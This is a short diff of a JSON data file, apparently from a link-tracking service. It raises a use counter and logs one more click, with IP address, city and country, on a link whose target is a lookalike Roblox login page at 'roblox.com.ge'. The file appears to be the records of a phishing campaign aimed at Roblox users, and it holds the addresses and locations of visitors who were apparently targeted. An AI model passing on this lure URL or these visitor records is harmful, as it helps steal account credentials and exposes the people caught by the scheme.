@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1633,
+    "useCount": 1634,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13230,6 +13230,14 @@
         "ip": "49.144.163.228",
         "country": "Philippines",
         "city": "Santo Tomas",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777552937884,
+        "ip": "111.90.220.40",
+        "country": "Philippines",
+        "city": "General Trias",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
